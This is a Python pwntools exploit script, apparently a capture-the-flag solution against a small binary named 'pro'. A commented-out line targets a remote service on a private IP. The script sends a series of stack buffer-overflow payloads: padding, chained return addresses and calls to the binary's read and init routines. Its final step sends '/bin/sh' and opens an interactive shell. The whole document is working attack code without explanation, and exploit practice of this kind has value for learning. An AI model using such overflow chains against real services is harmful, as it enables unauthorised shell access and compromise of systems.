from pwn import *

# r=remote("192.168.210.11",10013)
context.terminal = ["tmux", "splitw", "-h"]
output_addr = 0x080480F9
input_addr = 0x080480E1
r = process("./pro")
ret_addr = 0x08048110
read_again_addr = 0x0804811E
init_without_args = 0x080480E6
read_without_args = 0x080480E1
# gdb.attach(proc.pidof(r)[0], gdbscript='b %s\nb %s\n' % (output_addr, input_addr))
ret_num = 4

sleep(0.5)
r.recv()
payload = 'A' * 16
payload += p32(ret_addr) * ret_num
payload += p32(read_again_addr)
# addr_1 shoult not be interfered
raw_input("[*] send payload")
r.send(payload)

sleep(0.5)
raw_input("[^] recv....")
r.recvline()

payload2 = 'B' * 16
payload2 += p32(read_without_args)
payload2 += p32(read_again_addr)
raw_input("[*] send payload2")
r.send(payload2)
sleep(0.5)
raw_input("[^] recv....")
r.recvline()

payload_0 = '\x00' * 0x80
raw_input("[*] send payload_0")
r.send(payload_0)

payload3 = 'C' * 16
payload3 += p32(read_without_args)
payload3 += p32(init_without_args)
payload3 += p32(0)

raw_input("[*] send payload3")
r.send(payload3)

payload4 = '/bin/sh' + chr(0)
payload4 += 'A' * (11 - len(payload4))
raw_input("[*] send payload4")
r.send(payload4)
r.interactive()
